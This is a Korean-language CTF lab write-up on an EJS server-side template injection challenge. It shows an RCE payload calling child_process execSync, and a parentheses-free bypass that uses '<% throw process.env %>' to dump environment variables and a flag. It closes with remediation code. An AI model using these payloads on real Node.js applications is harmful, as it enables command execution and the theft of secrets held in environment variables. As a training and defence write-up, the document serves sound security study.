+++
title = "VulnABLE CTF [LUXORA] Write-up: SSTI 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SSTI", "Silver", "Bypass", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: SSTI 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (SSTI)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/ssti/silver`
- **목표**: 서버에서 함수 실행의 필수 요소인 소괄호 `(` 와 `)` 를 완벽하게 차단한 환경에서, 자바스크립트의 유연한 문법을 활용하여 필터를 우회하고 환경 변수에 숨겨진 플래그를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 필터링 제약 확인 (Reconnaissance)

`/ssti/silver` 페이지 역시 입력받은 이름을 화면에 인사말과 함께 출력하는 기능을 가집니다.

Bronze 단계에서 성공했던 RCE 페이로드를 다시 전송해 봅니다.
```http
GET /ssti/silver?greeting=<%= global.process.mainModule.require('child_process').execSync('id') %>
```

**[서버의 에러 응답]**
```text
[Blocked] Parentheses '(' and ')' are not allowed for security reasons.
```

**[해커의 사고 과정]**
1. 개발자가 소괄호 `()` 자체를 정규식으로 막아버렸다. 
2. 소괄호가 없으면 `require()`, `execSync()`, `toString()` 등 어떠한 함수도 정상적으로 호출할 수 없다. 
3. 명령어를 실행(RCE)하는 것 자체는 너무 많은 함수 호출(소괄호)을 요구하므로 우회가 까다롭다.
4. 하지만 템플릿 환경(Node.js)의 글로벌 변수인 **`process.env` (환경 변수 객체)**는 함수가 아니라 '속성(Property)'이므로 **괄호 없이 접근**할 수 있다!

---

## 💥 2. 필터링 우회 전략 설계 (Bypass Strategy)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Input: {{7*7}})--> [ Web Server ]
                                   |-- Template Engine Evaluates
<-- Returns: 49 -------------------|
```


명령어 실행(RCE) 대신 정보 유출(Information Disclosure)로 공격 방향을 선회합니다. 환경 변수에는 민감한 API 키나 챌린지 플래그가 들어있을 확률이 매우 높습니다.

### 💡 전략 1: 괄호 없는 객체 접근
EJS 템플릿에서 괄호 없이 객체의 속성에 접근하는 코드를 작성합니다.
```javascript
<%= process.env.FLAG %>
```
하지만 환경 변수의 정확한 키 이름이 `FLAG`가 아닐 수 있습니다. 모든 환경 변수를 한 번에 보고 싶습니다.

### 💡 전략 2: 예외 처리(Exception) 트릭을 이용한 객체 덤프
Node.js에서 객체 전체를 출력하려면 `JSON.stringify(process.env)` 같은 함수가 필요하지만, 이는 괄호가 필요합니다. 
이때 해커들이 즐겨 쓰는 마법의 키워드가 바로 **`throw`** 입니다.

자바스크립트에서 예외를 던질 때 문자열뿐만 아니라 객체 자체를 던질 수 있습니다.
```javascript
throw process.env;
```
이 코드가 EJS 엔진 내부에서 실행되면, 렌더링 중 크리티컬 에러가 발생하며 서버는 에러 스택 트레이스와 함께 던져진 객체(`process.env`)의 내용을 그대로 화면에 뿌려버리게 됩니다!

---

## 🚀 3. 공격 수행 및 익스플로잇 (Exploitation)

`throw` 키워드를 EJS의 스크립틀릿 태그 `<% ... %>` (출력 없는 단순 실행 태그) 안에 감싸서 전송합니다.

### 페이로드 조립
```javascript
<% throw process.env %>
```

URL 인코딩 변환:
```http
GET /ssti/silver?greeting=<%25%20throw%20process.env%20%25>
```

### 🔍 서버의 응답 (결과)
템플릿 렌더링 프로세스가 강제 종료되면서, 우리가 원했던 Node.js 프로세스의 모든 환경 변수 리스트가 화면에 토해져 나옵니다.

```text
Error: [object Object]
    at eval (eval at <anonymous> (/app/node_modules/ejs/lib/ejs.js:618:12), <anonymous>:11:7)
    ...
    USER: 'root',
    PWD: '/app',
    HOME: '/root',
    SILVER_FLAG: 'FLAG{SSTI_🥈_NO_PARENTHESES_E8D9C1}',
    NODE_VERSION: '18.16.0',
    ...
```

환경 변수 목록 속에서 `SILVER_FLAG` 라는 키로 저장된 플래그를 발견했습니다!

---

## 🚩 4. 롸잇업 결론 및 플래그

괄호를 차단하여 함수 실행을 막겠다는 개발자의 일차원적인 방어를, 언어 문법의 예외 처리 로직(`throw`)을 악용한 객체 덤핑 기법으로 우아하게 무력화했습니다.

**🔥 획득한 플래그:**
`FLAG{SSTI_🥈_NO_PARENTHESES_E8D9C1}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 단계의 문제는 두 가지입니다. 
1. 여전히 템플릿 코드에 사용자 입력을 직접 결합하고 있다는 점.
2. 프로덕션(Production) 환경에서 에러 스택 트레이스(Error Stack Trace)를 사용자 화면에 그대로 노출하고 있다는 점.

* **안전한 패치 코드 (에러 핸들링 및 데이터 바인딩)**
```javascript
// 1. 데이터는 변수로 바인딩
const template = "<h1>Welcome, <%= greeting %>!</h1>";

try {
    const html = ejs.render(template, { greeting: req.query.greeting });
    res.send(html);
} catch (err) {
    // 2. 에러 발생 시 절대 원본 에러 객체나 스택 트레이스를 사용자에게 반환하지 않음
    console.error(err); // 서버 내부 로그에만 기록
    res.status(500).send("Internal Server Error occurred.");
}
```
이렇게 조치하면 해커가 `throw process.env` 를 실행하더라도 화면에는 그저 "Internal Server Error occurred."만 출력되어 환경 변수 유출을 막을 수 있습니다. 물론 가장 중요한 것은 1번(데이터 바인딩)을 통해 애초에 `throw` 구문 자체가 실행되지 않게 하는 것입니다.